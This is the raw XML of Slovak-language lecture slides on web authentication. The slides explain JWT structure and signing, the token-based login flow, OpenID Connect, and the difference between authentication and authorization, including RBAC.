              <a:t>Napr. SPA aplikácie, REST rozhrania</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Stav aplikácie nie je uložený na serveri </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Klient zasiela informáciu o autentifikácii (token) pri každej žiadosti</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Takúto autentifikáciu používajú napr. Facebook, Google</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Ak sa chcete napr. prihlásiť do iných web aplikácií </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Najpoužívanejšia implementácia = JWT (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>JSON Web token</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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BEE1D75-20FE-4193-A16B-CF2594BB6B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3433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FB6661-9156-473F-ADFF-B86CBB32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JSON Web Token (JWT)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16284F5-F479-476A-9E99-9FE469BC7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Je otvorený štandard na bezpečný prenos údajov (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>RFC 7519</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Používa JSON formát (token je JSON objekt)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Využíva HMAC (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>hash message authentication code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>) na vytváranie odtlačku správ (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>hash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Prípadne kľúčový pár (asymetrická šifra)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Nezávislý na platforme, implementovaný v rôznych programovacích jazykoch</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Zabudovaná podpora vo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>frameworkoch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>Laravel</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0" err="1"/>
              <a:t>React</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>, ...)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Vhodný na riešenie autentifikácie/autorizácie</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Ale aj na bezpečnú výmenu dát (autentifikácia odosielateľa, nemennosť posielaných dát)</a:t>
            </a:r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C0CE8D6-E41E-4B8A-BD80-B91945095D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2332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9A4CA9-0CE6-4963-A33B-28E11F40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Zloženie JWT tokenu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E60477C-ED17-4EB4-8867-1D4D82183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JWT sa skladá z troch častí:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Hlavička (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>header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Obsah (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Podpis (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>signature</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Jednotlivé časti tokenu sa zakódujú pomocou </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Base64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> kódovania</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>A pospájajú sa bodkou (do jedného riadku)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>Debugger</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>zakódovanie a odkódovanie tokenov</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK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CFFC025-73A4-483C-8EAB-49C0262238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42</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="7" name="Rovná spojovacia šípka 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{726CEA37-09AD-41D4-9009-8023B2E898C2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715065" y="2183774"/>
            <a:ext cx="515815" cy="1373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Rovná spojovacia šípka 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5752ACB7-F98E-4058-8213-1326E22B852D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="2677551" y="2494671"/>
            <a:ext cx="543951" cy="770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Rovná spojovacia šípka 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F97D58C0-8879-4D5E-9697-3DE85778BE65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="2799471" y="2669724"/>
            <a:ext cx="431409" cy="199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BlokTextu 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CE40C345-93A2-4000-B590-CCD091EC1D6B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3230880" y="2212851"/>
            <a:ext cx="550525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1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="sk-SK" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D63AFF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="sk-SK" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00BFF5"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>cThIIoDvwdueQB468K5xDc5633seEFoqwxjF_xSJyQQ</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2057945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148803-EB02-49C9-A5BA-4AAA8FCC6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JWT hlavička (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>header</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>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B081B59-C778-4D5F-AB17-B5808897F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Obsahuje informáciu o type tokenu a algoritme používaného na podpisovanie</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Príklad: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F55B382-F863-4F52-8BF0-D15295A9D5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43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E2477DA-5925-4894-8DFE-C8B0CB09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507" y="2355260"/>
            <a:ext cx="1524776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alg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"HS256"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"typ"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"JWT"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355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F09ED3-E7ED-4D73-B698-4D3DC3FD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JWT obsah (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>payload</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>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550DB70-58DD-46A1-8CD4-591434C6A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2"/>
            <a:ext cx="8272200" cy="2922560"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Obsahuje potrebné informácie (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>claims</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Informácie sú troch typov:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Registrované (napr. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>sub</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> – identifikácia tokenu, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>iat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> – časová pečiatka, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" sz="1200" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>iss</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> – vydavateľ tokenu,...)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Verejné (vlastné) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Privátne (vlastné, vopred dohodnuté medzi stranami komunikácie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Príklad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120F38B-9C53-4BEB-9F7C-6EFA581BC9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44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6A77235-8F3C-4F65-A12F-AD77F4355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264" y="3619436"/>
            <a:ext cx="1877437" cy="8617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sub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"1234567890"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"John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Doe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iat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1516239022</a:t>
            </a:r>
            <a:b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</a:b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7056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655572-B484-4577-A425-D9C1D0CB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JWT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>podpis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>signature</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="sk-SK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D900980-A729-4241-95D6-B4FF60B42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Podpis vypočítaný na základe vzorca:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Používa sa na overenie, že správa nebola zmenená </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Prípadne overenie autenticity odosielateľa</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Secret</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>vopred určený reťazec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545A7ED9-B4C9-4EB9-BC48-687A53903D1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45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3F5CBA4-0E93-4B04-8001-8BBD632E2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03" y="2065567"/>
            <a:ext cx="568937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sk-SK" altLang="sk-SK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HMACSHA256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(base64UrlEncode(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"." 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base64UrlEncode(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kumimoji="0" lang="sk-SK" altLang="sk-SK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secret</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="sk-SK" altLang="sk-SK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sk-SK" altLang="sk-S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0111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BBEC67-B251-45EE-B655-BF27C6B4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Postup pri JWT autentifikácii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3C708F2-5307-4002-8C1C-1FE1FB677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69900" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Klient vyplní meno a heslo (napr. HTML formulár)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="469900" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Odošle prihlasovacie informácie na server (HTTP POST, AJAX, ...)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="469900" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Server vytvorí token s potrebnými informáciami (napr. id používateľa, čas platnosti, ...</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="469900" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Server do odpovede vloží zakódovaný token</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="469900" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Klient si token odloží a pri každej komunikácii ho pridá k požiadavke na server </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="469900" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Pri odhlásení klient token vymaže (lokálne) a nepošle </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK"/>
              <a:t>na server</a:t>
            </a:r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6B5ADDDB-8BFC-4446-B16F-4558B493B2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6234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95676F9-04C5-D8F5-EDF5-AA57B85A1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OpenID Connect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7DEA234-E39E-7976-3069-0626FF123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5894" y="1635371"/>
            <a:ext cx="8272200" cy="3107353"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Štandard pre overovanie identity na</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>internete</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Umožňuje používateľom vytvoriť jedno identifikačné meno a heslo </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="sk-SK" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>pre prihlásenie na rôzne webové stránky</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Nie je nutné  heslo zadávať do webu poskytovateľa služby</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Používateľ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> vyberá dôveryhodného poskytovateľa </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>OpenID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> identity (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Identity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>Provider</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>Napr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. Google, Facebook,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> Microsoft, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>Github</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Používa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> JWT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>tokeny</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>OpenID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Connect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> (OICD) kombinuje </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>OpenID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> s protokolom </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>OAuth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> 2.0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Overenie identity používateľa a definovanie rozsahu prístupových práv</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="sk-SK" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US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9DA71822-F9EE-9707-2F1F-A5BC72D7C4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47</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Obrázok 5" descr="Obrázok, na ktorom je logo, grafika, symbol, grafický dizajn&#10;&#10;Automaticky generovaný popis">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{181A186F-1CE7-5C78-DA50-AD1F73658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729" y="1458707"/>
            <a:ext cx="2456329" cy="92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4407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BC5574-149E-E59F-6C34-ED079F9E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Ako </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>OpenID Connect </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>funguje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192B63B-8B38-F64F-F2A3-C5047AD5E4C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48</a:t>
            </a:fld>
            <a:endParaRPr lang="en-GB"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Obrázok 5" descr="Obrázok, na ktorom je text, snímka obrazovky, diagram, písmo&#10;&#10;Automaticky generovaný popis">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BB1E1386-7D56-9E10-7CEC-84434CB5D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948" y="1414199"/>
            <a:ext cx="5568091" cy="3402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4661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25F8AF-D82E-4E26-A5FD-BFBF5494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Autentifikácia – autorizácia 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9DC5068-6246-41CE-B6FB-15FB175B5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Autentifikácia</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Overenie identity používateľa</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Rôzne spôsoby riešenia</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Dvojfaktorová autentifikácia</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Autorizácia</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Pridelenie práv vykonávať nejakú činnosť v aplikácii</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Neumožniť vykonanie iných činností</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Najčastejšie spôsoby riešenia: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>ACL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> , </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>ABAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>RBAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>, ...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90B220A-38E4-4658-8F57-02BAD6D8A2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9040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329A0C-9D42-9926-B9D5-4AF677F0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Role-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>Based</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> Access </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0" err="1"/>
              <a:t>Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t> (RBAC)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C58CABA-C22B-0212-6A59-F57C3D5DF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Model riadenia prístupu k zdrojom založený na roliach </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Skladá sa z nasledovných komponentov:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Role</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Používatelia</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Oprávnenia</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Zdroje</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
              <a:t>Vhodnejší pre menej komplexné systémy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="sk-SK" dirty="0"/>
